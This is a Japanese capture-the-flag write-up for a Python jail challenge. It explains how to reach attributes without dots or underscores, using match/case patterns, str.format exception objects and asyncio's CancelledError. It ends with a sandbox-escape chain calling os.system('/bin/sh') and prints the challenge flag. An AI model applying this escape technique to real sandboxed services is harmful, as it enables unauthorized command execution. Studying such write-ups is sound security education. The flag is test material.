# Future With Escape

## 問題文

There was an exit

## Writeup

この問題では`.`が使えないことが最大のネックとなる。[pyjailのチートシート](https://shirajuki.js.org/blog/pyjail-cheatsheet/#getting-attributes)を見ると、様々な方法で属性にアクセスする方法が書かれている。そのうちの一つである次の手法に注目する。

```python
match ():
    case object(__doc__=a):
        pass
print(a) # ().__doc__
```

`object`の箇所について、別のクラスを利用することもできるが、その場合はそのクラスに属するインスタンスからしか要素を取り出すことができない。

`Future.__class__`は`type`と一致する。そして、この`type`はクラスであると同時に`type(obj)`で`obj`のクラスを返す関数でもある。したがって、`future('__class__', obj)`を実行すると、`obj`のクラスへの参照を得ることができる。

これを利用して以下のように、例えば`"foobar".encode("utf-8")`が実行できる。

```python
str = future("\x5f\x5fclass\x5f\x5f", "")
type = future("\x5f\x5fclass\x5f\x5f", str)
match str:
    case type(encode=encode):
        pass
# str.encode("foobar", "utf-8")は"foobar".encode("utf-8")と同義
encode("foobar", "utf-8")
```

ただし、`_`が使えないため、この方法では`__subclasses__`のような、dunder属性やメソッドにアクセスできないため、RCEまでつなげるのは難しい。そこで、属性にアクセスする第2の方法を利用する。

```python
try:
  "{0.__doc__.lol}".format(())
except Exception as e:
  a = e.obj
  print(a) # ().__doc__
```

第1の方法を組み合わせることで、`str.format`を取得できるし、`e.obj`にアクセスすることもできる。`Exception`か`BaseException`オブジェクトさえ手に入れば、この方法でdunder関数にアクセスできそうである。(`except ... as e`の`...`の箇所は、`BaseException`クラスを継承したクラスのインスタンスでなければ実行エラーとなる。)

[`Future._make_cancelled_error`](https://github.com/python/cpython/blob/95d6e0b2830c8e6bfd861042f6df6343891d5843/Lib/asyncio/futures.py#L135)は、`CancelledError`オブジェクトを返す関数であり、`future("_make_cancelled_error", fut)`で取得できる。`CancelledError`は`BaseException`を継承しているので、`CancelledError.mro()`は`[CancelledError, BaseException, object]`の配列となる。そして、この配列に対して`pop`関数を利用することで、順に`object`と`BaseException`への参照を手に入れることができる。

これにより、任意の属性にアクセスできるようになったので、

```python
object.__subclassess__().__getitem__(190).__init__.__globals__.get("system")("/bin/sh")
```
と同等のコードをすれば良い。([参考](https://zenn.dev/tchen/articles/c75d9ee9d4c076))

## Flag

`fwectf{y0u_c4n_35c4p3_fr0m_j41l_bu7_n07_fu7ur3}`

